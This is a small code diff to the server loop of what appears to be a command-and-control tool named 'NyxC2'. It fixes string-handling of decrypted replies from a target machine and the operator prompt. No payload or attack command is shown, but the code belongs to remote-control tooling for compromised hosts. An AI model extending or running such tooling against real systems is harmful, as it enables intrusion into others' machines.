@@ -162,6 +162,7 @@ def server():
                         # are replaced so decoding cannot stop the event loop.
 
                         if length_bytes != 4:
+                            new_data = ""
                             match type_byte:
                                 case 0x01:
                                     aes_key = rsa_decryption(private_key, ciphertext)
@@ -183,8 +184,8 @@ def server():
                             new_data = plaintext
                             print(f"\n[answer from {nom_cible}] :\n {new_data}")
                             
-                        new_data = new_data.decode("utf-8", errors="ignore")
-                        if new_data.endswith(">"):
+                        # text_to_print = new_data.decode("utf-8", errors="ignore")
+                        if isinstance(new_data, str) and new_data.endswith(">"):
                             print("\nNyxC2 > ", end="", flush=True)
 
                 except ConnectionResetError:
